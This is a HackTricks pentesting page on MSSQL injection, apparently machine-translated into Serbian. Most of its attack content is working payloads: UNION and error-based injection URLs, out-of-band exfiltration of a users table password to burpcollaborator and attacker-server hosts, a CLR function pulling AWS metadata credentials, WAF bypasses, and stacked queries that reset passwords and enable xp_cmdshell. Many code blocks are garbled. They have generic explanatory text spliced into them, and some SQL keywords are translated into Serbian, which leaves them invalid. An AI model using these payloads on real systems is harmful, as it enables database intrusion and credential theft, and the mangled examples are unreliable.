# MSSQL Injection

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Enumeracija Active Directory-ja

Mogu캖e je **enumerisati korisnike domena putem SQL injection-a unutar MSSQL** servera koriste캖i slede캖e MSSQL funkcije:

* **`SELECT DEFAULT_DOMAIN()`**: Dobijanje trenutnog imena domena.
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**: Ako znate ime domena (_DOMAIN_ u ovom primeru), ova funkcija 캖e vratiti **SID korisnika Administrator** u heksadecimalnom formatu. Izgleda캖e kao `0x01050000000[...]0000f401`, obratite pa쬹ju kako su **poslednja 4 bajta** broj **500** u **big endian** formatu, 코to je **uobi캜ajeni ID korisnika administratora**.\
Ova funkcija 캖e vam omogu캖iti da **znate ID domena** (svi bajtovi osim poslednjih 4).
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : Ova funkcija 캖e vratiti **korisni캜ko ime za navedeni ID** (ako postoji), u ovom slu캜aju **0000e803** u big endian == **1000** (obi캜no je ovo ID prvog redovnog korisnika kreiranog). Tada mo쬰te pretpostaviti da mo쬰te poku코ati brute-force ID-ova korisnika od 1000 do 2000 i verovatno dobiti sva korisni캜ka imena korisnika domena. Na primer, koriste캖i funkciju kao 코to je slede캖a:
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **Alternativni vektori zasnovani na gre코kama**

SQL injekcije zasnovane na gre코kama obi캜no podse캖aju na konstrukcije poput `+AND+1=@@version--` i varijante zasnovane na operatoru 춺OR췉. Upiti koji sadr쬰 takve izraze obi캜no su blokirani od strane WAF-ova. Kako biste zaobi코li to, spojite string koriste캖i karakter %2b sa rezultatom odre캠enih funkcija koje izazivaju gre코ku konverzije tipa podataka na tra쬰ne podatke.

Neki primeri takvih funkcija:

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

Primer kori코캖enja funkcije `USER_NAME()`:
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

Ove trikove za SSRF [preuzeti su odavde](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

### `fn_xe_file_target_read_file`

Zahteva dozvolu **`VIEW SERVER STATE`** na serveru.
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

Zahteva dozvolu **`CONTROL SERVER`**.
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettabe`

Zahteva dozvolu **`CONTROL SERVER`**.
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

Procedura 캜uvanja kao 코to je `xp_dirtree`, iako nije zvani캜no dokumentovana od strane Microsoft-a, opisana je od strane drugih na internetu zbog svoje korisnosti u mre쬹im operacijama unutar MSSQL-a. Ove procedure se 캜esto koriste u izvla캜enju podataka van mre쬰, kao 코to je prikazano u raznim [primerima](https://www.notsosecure.com/oob-exploitation-cheatsheet/) i [postovima](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/).

Na primer, procedura 캜uvanja `xp_dirtree` se koristi za slanje mre쬹ih zahteva, ali je ograni캜ena samo na TCP port 445. Broj porta nije mogu캖e menjati, ali omogu캖ava 캜itanje sa mre쬹ih deljenih resursa. Upotreba je prikazana u slede캖em SQL skriptu:
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\' + @user + '.attacker-server\\aa"');
```
Va쬹o je napomenuti da ova metoda mo쬯a ne캖e raditi na svim konfiguracijama sistema, kao na primer na `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)` koji se izvodi na `Windows Server 2016 Datacenter` sa podrazumevanim pode코avanjima.

Dodatno, postoje alternativne uskladi코tene procedure poput `master..xp_fileexist` i `xp_subdirs` koje mogu posti캖i sli캜ne rezultate. Dodatne detalje o `xp_fileexist` mo쬰te prona캖i u ovom [TechNet 캜lanku](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx).


### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

O캜igledno, tako캠e mo쬰te koristiti **`xp_cmdshell`** da **izvr코ite** ne코to 코to pokre캖e **SSRF**. Za vi코e informacija **pro캜itajte relevantni odeljak** na stranici:

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQL Korisni캜ki definisana funkcija - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

Kreiranje CLR UDF (Common Language Runtime User Defined Function), 코to je kod napisan na bilo kom .NET jeziku i kompajliran u DLL, da bi se u캜itao unutar MSSQL-a radi izvr코avanja prilago캠enih funkcija, je proces koji zahteva pristup `dbo`. To zna캜i da je obi캜no izvodljivo samo kada je veza sa bazom podataka uspostavljena kao `sa` ili sa administratorskom ulogom.

Projekat u Visual Studiju i uputstva za instalaciju su dostupni u [ovom Github repozitorijumu](https://github.com/infiniteloopltd/SQLHttp) kako bi se olak코alo u캜itavanje binarnog fajla u MSSQL kao CLR skup, 캜ime se omogu캖ava izvr코avanje HTTP GET zahteva unutar MSSQL-a.

Sr ove funkcionalnosti je sadr쬬na u fajlu `http.cs`, koji koristi klasu `WebClient` za izvr코avanje GET zahteva i dobijanje sadr쬬ja, kako je prikazano u nastavku:
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString(html);
}
}
```
Pre nego 코to izvr코ite `CREATE ASSEMBLY` SQL naredbu, preporu캜uje se da pokrenete slede캖i SQL isje캜ak kako biste dodali SHA512 he코 skupa u listu pouzdanih skupova servera (vidljivo putem `select * from sys.trusted_assemblies;`):
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
Nakon uspe코nog dodavanja skupa instrukcija i kreiranja funkcije, mo쬰 se koristiti slede캖i SQL kod za izvr코avanje HTTP zahteva:
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
### **Brzo iskori코캖avanje: Dobijanje celokupnog sadr쬬ja tabele u jednom upitu**

[Trik sa ovog linka](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

Konzistentan metod za izvla캜enje celokupnog sadr쬬ja tabele u jednom upitu uklju캜uje kori코캖enje klauzule `FOR JSON`. Ovaj pristup je kra캖i od kori코캖enja klauzule `FOR XML`, koja zahteva odre캠eni mod kao 코to je "raw". Klauzula `FOR JSON` je po쬰ljnija zbog svoje krac패e sintakse.

Evo kako da dobijete 코emu, tabele i kolone iz trenutne baze podataka:
```sql
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
In situations where error-based vectors are used, it's crucial to provide an alias or a name. This is because the output of expressions, if not provided with either, cannot be formatted as JSON. Here's an example of how this is done:

```sql
## MSSQL Injection

### Osnovno

MSSQL Injection je tehnika napada koja omogu캖ava napada캜u da izvr코i zlonamerni SQL kod na MSSQL bazi podataka. Ova tehnika se koristi za otkrivanje i iskori코캖avanje ranjivosti u aplikacijama koje koriste MSSQL bazu podataka.

### Identifikacija MSSQL Injection ranjivosti

Da biste identifikovali MSSQL Injection ranjivosti, mo쬰te koristiti razli캜ite tehnike, kao 코to su:

- Unos specijalnih karaktera: Poku코ajte da unesete specijalne karaktere kao 코to su jednostruki navodnici ('), dvostruki navodnici ("), kose crte (/) i drugi karakteri koji mogu izazvati gre코ke u SQL upitima.

- Gre코ke na strani servera: Ako primetite gre코ke na strani servera koje otkrivaju SQL kod ili strukturu baze podataka, to mo쬰 ukazivati na ranjivost MSSQL Injection.

- Vreme odziva: Ako primetite da je vreme odziva servera du쬰 nego obi캜no, to mo쬰 ukazivati na izvr코avanje slo쬰nih SQL upita, 코to mo쬰 biti znak MSSQL Injection ranjivosti.

### Eksploatacija MSSQL Injection ranjivosti

Kada identifikujete MSSQL Injection ranjivost, mo쬰te je iskoristiti za izvr코avanje zlonamernog SQL koda. Evo nekoliko tehnika koje mo쬰te koristiti:

- Izvr코avanje UNION upita: Mo쬰te koristiti UNION upit za spajanje rezultata dva ili vi코e SQL upita. Ovo vam omogu캖ava da izvu캜ete podatke iz baze podataka.

- Izvr코avanje SELECT upita: Mo쬰te izvr코iti SELECT upit kako biste izvukli podatke iz baze podataka. Na primer, mo쬰te koristiti SELECT * FROM tabela kako biste izvukli sve podatke iz odre캠ene tabele.

- Izvr코avanje INSERT, UPDATE ili DELETE upita: Mo쬰te izvr코iti INSERT, UPDATE ili DELETE upit kako biste promenili podatke u bazi podataka.

### Prevencija MSSQL Injection ranjivosti

Da biste spre캜ili MSSQL Injection ranjivosti, preporu캜uje se slede캖e:

- Kori코캖enje parametrizovanih upita: Koristite parametrizovane upite umesto konkatenacije korisni캜kog unosa u SQL upite. Ovo poma쬰 u spre캜avanju ubacivanja zlonamernog koda.

- Validacija korisni캜kog unosa: Validirajte korisni캜ki unos kako biste osigurali da sadr쬴 samo o캜ekivane vrednosti. Ovo poma쬰 u spre캜avanju ubacivanja zlonamernog koda.

- Kori코캖enje principa najmanjih privilegija: Dodelite samo neophodne privilegije korisnicima baze podataka kako biste smanjili rizik od zloupotrebe MSSQL Injection ranjivosti.

### Zaklju캜ak

MSSQL Injection je ozbiljna ranjivost koja mo쬰 dovesti do neovla코캖enog pristupa i manipulacije podacima u MSSQL bazama podataka. Identifikacija i prevencija ove ranjivosti su klju캜ni za odr쬬vanje sigurnosti aplikacija koje koriste MSSQL bazu podataka.
```

### Retrieving the Current Query

[Trick from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

For users granted the `VIEW SERVER STATE` permission on the server, it's possible to see all executing sessions on the SQL Server instance. However, without this permission, users can only view their current session. The currently executing SQL query can be retrieved by accessing sys.dm_exec_requests and sys.dm_exec_sql_text:

```sql
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null

Ovde je prikazan primer SQL injection napada na Microsoft SQL Server bazu podataka. U ovom slu캜aju, korisnik je iskoristio ranjivost u aplikaciji "vuln.app" tako 코to je u URL-u promenio vrednost parametra "id" na "-1 union select null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null". Ova SQL naredba se izvr코ava u kontekstu baze podataka i omogu캖ava korisniku da izvr코i proizvoljan SQL kod.

Napada캜 koristi "union select" operator kako bi kombinovao rezultate dve SQL naredbe. Prva naredba "null" se koristi kako bi se izbeglo otkrivanje gre코aka, dok se druga naredba izvr코ava kako bi se dobio tekst iz tabele "sys.dm_exec_requests" i "sys.dm_exec_sql_text". Ovim se omogu캖ava napada캜u da izvu캜e informacije iz baze podataka koje nisu namenjene javnom prikazu.

Ovaj primer ilustruje va쬹ost pravilne validacije i sanitizacije korisni캜kog unosa kako bi se spre캜ili SQL injection napadi. Tako캠e, preporu캜uje se kori코캖enje parametrizovanih upita ili ORM alata koji automatski sanitizuju korisni캜ki unos kako bi se smanjio rizik od ovakvih napada.
```

To check if you have the VIEW SERVER STATE permission, the following query can be used:

```sql
```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```

Ovaj SQL upit se koristi za prikazivanje dozvola korisnika za pregledanje stanja servera.
```

## **Little tricks for WAF bypasses**

[Tricks also from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

Non-standard whitespace characters: %C2%85 햦햩햦 %C2%A0:

```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--

---

### MSSQL Injection

#### Opis

MSSQL Injection je tehnika napada koja omogu캖ava napada캜u da izvr코i zlonamerni SQL kod na MSSQL bazi podataka. Ova tehnika se koristi za otkrivanje i iskori코캖avanje ranjivosti u aplikacijama koje koriste MSSQL bazu podataka.

#### Napadni vektor

Napadni vektor za MSSQL Injection je unos SQL koda putem korisni캜kog interfejsa aplikacije koja koristi MSSQL bazu podataka. Ovaj unos se obi캜no vr코i putem polja za unos podataka, kao 코to je URL parametar ili formular.

#### Otkrivanje MSSQL Injection ranjivosti

Da biste otkrili MSSQL Injection ranjivost, mo쬰te isprobati razli캜ite tehnike, kao 코to je uno코enje SQL koda u polje za unos podataka. Ako primetite da se SQL kod izvr코ava ili da se vra캖aju osetljivi podaci, to mo쬰 ukazivati na ranjivost.

#### Eksploatacija MSSQL Injection ranjivosti

Kada otkrijete MSSQL Injection ranjivost, mo쬰te je iskoristiti za izvr코avanje razli캜itih zlonamernih radnji, kao 코to su izvla캜enje osetljivih podataka, modifikacija ili brisanje podataka, izvr코avanje proizvoljnog koda i preuzimanje kontrole nad sistemom.

#### Prevencija MSSQL Injection ranjivosti

Da biste spre캜ili MSSQL Injection ranjivost, preporu캜uje se kori코캖enje parametrizovanih upita ili spre캜avanje izvr코avanja SQL koda unesenog od strane korisnika. Tako캠e je va쬹o a쬿rirati i zakrpati MSSQL server kako bi se ispravile poznate ranjivosti.
```

Scientific (0e) and hex (0x) notation for obfuscating UNION:

```
## MSSQL Injection

### Union-Based SQL Injection

#### Basic Union-Based SQL Injection

Osnovna Union-Based SQL Injection tehnika se mo쬰 primeniti na MSSQL baze podataka. Ova tehnika se koristi za izvla캜enje podataka iz baze kroz SQL upit.

Da biste izvr코ili Union-Based SQL Injection, potrebno je da prona캠ete ta캜ku unosa koja je podlo쬹a SQL Injection napadu. U ovom slu캜aju, ta캜ka unosa je `id` parametar u URL-u.

Primeri URL-ova koji su podlo쬹i SQL Injection napadu:

- `https://vuln.app/getItem?id=0eunion+select+null,@@version,null--`
- `https://vuln.app/getItem?id=0xunion+select+null,@@version,null--`

U ovim primerima, `@@version` funkcija se koristi za dobijanje verzije MSSQL servera. Kroz SQL Injection napad, mo쬰mo izvr코iti ovu funkciju i dobiti informacije o verziji servera.

#### Izvr코avanje SQL upita

Da biste izvr코ili SQL upit putem Union-Based SQL Injection, potrebno je da prona캠ete broj kolona u ciljanoj tabeli. Mo쬰te to uraditi pomo캖u slede캖eg upita:

```
https://vuln.app/getItem?id=0eunion+select+null,null,null--
```

Ako dobijete gre코ku, pove캖ajte broj `null` vrednosti u upitu dok ne dobijete rezultate bez gre코ke. Na primer:

```
https://vuln.app/getItem?id=0eunion+select+null,null,null,null--
```

Kada prona캠ete broj kolona, mo쬰te izvr코iti SQL upit i izvu캖i podatke iz baze. Na primer, ako ciljate tabelu `users` sa 3 kolone, mo쬰te koristiti slede캖i upit:

```
https://vuln.app/getItem?id=0eunion+select+null,username,password+from+users--
```

Ovaj upit 캖e izvu캖i korisni캜ka imena i lozinke iz tabele `users`.
```

A period instead of a whitespace between FROM and a column name:

```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--

---

### MSSQL Injection

#### Opis

MSSQL Injection je tehnika napada koja omogu캖ava napada캜u da izvr코i zlonamerni SQL kod na MSSQL bazi podataka. Ova tehnika se koristi za izvla캜enje osetljivih informacija, modifikaciju podataka ili 캜ak za izvr코avanje proizvoljnog koda na serveru.

#### Napad

Jedan od na캜ina za izvr코avanje MSSQL Injection napada je kori코캖enje SQL Injection payloada u URL parametru. Na primer, u URL-u `https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--`, napada캜 koristi `1 union select null,@@version,null from.users--` kao vrednost parametra `id`. Ovaj payload se koristi za izvr코avanje SQL upita koji 캖e izvu캖i verziju MSSQL servera.

#### Prevencija

Da bi se spre캜io MSSQL Injection napad, preporu캜uje se kori코캖enje parametrizovanih upita ili spre캜avanje izvr코avanja nebezbednih SQL kodova. Tako캠e je va쬹o a쬿rirati MSSQL server na najnoviju verziju i primeniti sigurnosne zakrpe kako bi se ispravile poznate ranjivosti.
```

\N separator between SELECT and a throwaway column:

```
# MSSQL Injection

## Osnovno

MSSQL Injection je tehnika napada koja omogu캖ava napada캜u da izvr코i zlonamerni SQL kod na MSSQL bazi podataka. Ova tehnika se koristi za otkrivanje ranjivosti u aplikacijama koje koriste MSSQL bazu podataka i omogu캖ava napada캜u da izvr코ava neovla코캖ene SQL upite.

## Identifikacija MSSQL Injection ranjivosti

Da biste identifikovali MSSQL Injection ranjivost, mo쬰te iskoristiti slede캖e metode:

1. Unos neva쬰캖ih karaktera: Poku코ajte da unesete neva쬰캖e karaktere kao 코to su jednostruki navodnici ('), dvostruki navodnici ("), kose crte (/) ili komentare (--). Ako primetite da se aplikacija pona코a druga캜ije ili prikazuje gre코ke, to mo쬰 ukazivati na ranjivost.

2. Gre코ke baze podataka: Ako primetite gre코ke baze podataka koje se prikazuju na veb stranici ili u HTTP odgovoru, to mo쬰 ukazivati na ranjivost. Ove gre코ke mogu otkriti informacije o strukturi baze podataka ili izvr코iti SQL upite.

3. Vremenska ka코njenja: Ako primetite da se vreme odgovora servera zna캜ajno pove캖ava nakon slanja odre캠enih zahteva, to mo쬰 ukazivati na ranjivost. Napada캜 mo쬰 iskoristiti ovo ka코njenje kako bi izvr코io SQL upite.

## Eksploatacija MSSQL Injection ranjivosti

Kada identifikujete MSSQL Injection ranjivost, mo쬰te je iskoristiti za izvr코avanje zlonamernog SQL koda. Evo nekoliko tehnika koje mo쬰te koristiti:

1. Izvr코avanje SELECT upita: Mo쬰te izvr코iti SELECT upit kako biste dohvatili podatke iz baze podataka. Na primer, mo쬰te koristiti UNION SELECT izraz kako biste dohvatili podatke iz druge tabele.

2. Izvr코avanje INSERT, UPDATE ili DELETE upita: Mo쬰te izvr코iti INSERT, UPDATE ili DELETE upit kako biste izmenili podatke u bazi podataka. Ovo mo쬰 biti korisno ako 쬰lite da promenite ili obri코ete odre캠ene podatke.

3. Izvr코avanje sistemskih komandi: Mo쬰te izvr코iti sistemsku komandu kako biste dobili pristup operativnom sistemu. Na primer, mo쬰te izvr코iti komandu xp_cmdshell kako biste izvr코ili sistemsku komandu na serveru.

## Prevencija MSSQL Injection ranjivosti

Da biste spre캜ili MSSQL Injection ranjivost, mo쬰te preduzeti slede캖e mere:

1. Kori코캖enje parametrizovanih upita: Umesto da koristite konkatenaciju stringova za formiranje SQL upita, koristite parametrizovane upite. Ovo 캖e spre캜iti napada캜e da ubace zlonamerni SQL kod.

2. Validacija unosa: Validirajte sve korisni캜ke unose kako biste spre캜ili unos neva쬰캖ih karaktera ili SQL koda.

3. Kori코캖enje principa najmanjih privilegija: Dodelite samo neophodne privilegije korisnicima baze podataka kako biste smanjili rizik od zloupotrebe.

4. A쬿riranje softvera: Redovno a쬿rirajte MSSQL server i aplikacije kako biste ispravili poznate ranjivosti.

## Zaklju캜ak

MSSQL Injection je ozbiljna ranjivost koja mo쬰 omogu캖iti napada캜u da izvr코ava zlonamerne SQL upite na MSSQL bazi podataka. Identifikacija i prevencija ove ranjivosti su klju캜ni za odr쬬vanje sigurnosti aplikacija koje koriste MSSQL bazu podataka.
```

### WAF Bypass with unorthodox stacked queries

According to [**this blog post**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/) it's possible to stack queries in MSSQL without using ";":

```sql
SELECT 'a' SELECT 'b'
```

So for example, multiple queries such as:

```sql
```sql
use [tempdb]
create table [test] ([id] int)
insert [test] values(1)
select [id] from [test]
drop table[test]
```

```sql
koristi [tempdb]
kreiraj tabelu [test] ([id] int)
ubaci vrednosti u [test] (1)
selektuj [id] iz [test]
obrisi tabelu [test]
```
```

Can be reduced to:

```sql
Koristite[tempdb]kreirajte/**/tabelu[test]([id]int)ubaci[test]vrednosti(1)izaberi[id]iz[test]obri코i/**/tabelu[test]
```

Therefore it could be possible to bypass different WAFs that doesn't consider this form of stacking queries. For example:

```
# Dodavanje beskorisnog exec() na kraju i navo캠enje WAF-a da ovo nije validan upit
admina'union select 1,'admin','testtest123'exec('select 1')--
## Ovo 캖e biti:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Kori코캖enje 캜udno konstruisanih upita
admin'exec('update[users]set[password]=''a''')--
## Ovo 캖e biti:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Ili omogu캖avanje xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## Ovo 캖e biti:
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--'
```

## References

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
